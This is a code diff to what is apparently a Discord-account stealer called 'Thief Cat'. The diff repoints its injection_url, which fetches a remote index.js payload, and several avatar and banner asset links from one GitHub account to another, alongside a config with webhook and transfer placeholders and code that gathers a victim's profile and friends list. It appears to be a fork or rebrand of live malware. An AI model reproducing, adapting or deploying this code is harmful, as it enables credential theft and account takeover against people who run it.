@@ -23,7 +23,7 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/meccksch/cerf/main/index.js",
+    "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -82,7 +82,7 @@ async function execScript(str) {
     var params = {
       username: "Thief Cat",
       avatar_url:
-        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/thiefcat.png",
+        "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/assets/thiefcat.png",
       content: "",
       embeds: [
         {
@@ -591,10 +591,10 @@ async function execScript(str) {
         var Friends = parseFriends(friends);
         if (!user.avatar)
           var userAvatar =
-            "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/cat-2d-animation.gif";
+            "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/assets/cat-2d-animation.gif";
         if (!user.banner)
           var userBanner =
-            "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/Thief%20Cat.gif";
+            "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/assets/Thief%20Cat.gif";
   
         userBanner =
           userBanner ??
@@ -729,10 +729,10 @@ async function execScript(str) {
           var Friends = parseFriends(friends);
           if (!user.avatar)
             var userAvatar =
-              "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/cat-2d-animation.gif";
+              "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/assets/cat-2d-animation.gif";
           if (!user.banner)
             var userBanner =
-              "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/Thief%20Cat.gif";
+              "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/assets/Thief%20Cat.gif";
   
           userBanner =
             userBanner ??
@@ -950,10 +950,10 @@ async function execScript(str) {
     );
     if (!user.avatar)
       var userAvatar =
-        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/cat-2d-animation.gif";
+        "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/assets/cat-2d-animation.gif";
     if (!user.banner)
       var userBanner =
-        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/Thief%20Cat.gif";
+        "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/assets/Thief%20Cat.gif";
   
     var userBanner =
       userBanner ??
